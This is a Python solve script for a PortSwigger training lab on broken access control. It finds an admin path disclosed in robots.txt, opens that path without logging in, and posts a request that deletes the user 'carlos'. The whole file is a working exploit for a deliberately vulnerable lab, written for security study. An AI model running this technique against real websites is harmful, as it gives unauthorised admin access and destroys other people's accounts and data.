# Lab 01 — Unprotected admin functionality
# PortSwigger: https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality
#
# Vulnerability: Admin panel has no access control checks whatsoever
# Aim:           Delete the user carlos via the admin panel
#
# Technique:
#   The admin path is disclosed in robots.txt (meant to hide it from search
#   engines — it ends up disclosing it to us instead). The path itself has
#   zero authentication or authorization checks: anyone, logged in or not,
#   can load it directly.
#
# Usage: python access_control_lab01.py <url>

import sys
import urllib3
from proxies import proxies
from access_control_utils import banner, section, make_session, check_status, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 01 — UNPROTECTED ADMIN FUNCTIONALITY")

    if len(sys.argv) != 2:
        print("  Usage: python access_control_lab01.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    # ── Step 1: check robots.txt for the disclosed admin path ───────────────
    print("  ── Step 1: check robots.txt for disclosed admin path\n")
    r = session.get(f"{url}/robots.txt")
    print_box("robots.txt contents", r.text)

    admin_path = None
    for line in r.text.splitlines():
        if "Disallow:" in line:
            admin_path = line.split("Disallow:")[1].strip()
            break

    if not admin_path:
        print("  ✘  Could not find a Disallow path — check robots.txt manually")
        sys.exit(1)

    print(f"  ✔  Found disclosed path: {admin_path}\n")

    # ── Step 2: access the admin panel directly, no login required ──────────
    print("  ── Step 2: access the admin panel with NO authentication\n")
    r2 = session.get(f"{url}{admin_path}")
    check_status(r2, 200, "Admin panel access")

    if "carlos" not in r2.text:
        print("  ?  'carlos' not visible on this page — inspect manually")
        sys.exit(0)

    print("  ✔  'carlos' user found on the admin panel — delete link/button present\n")

    # ── Step 3: delete carlos ────────────────────────────────────────────────
    print("  ── Step 3: delete carlos\n")
    # The delete action is typically a GET or POST to a path like:
    #   /admin-panel/delete?username=carlos
    delete_url = f"{url}{admin_path}/delete"
    r3 = session.post(delete_url, data={"username": "carlos"})
    check_status(r3, [200, 302], "Delete carlos")

    print()
    print("  ℹ  If the delete request shape differs, inspect the admin panel's")
    print("     HTML for the exact delete link/form and adjust delete_url above.")
    print(f"     Admin panel: {url}{admin_path}")
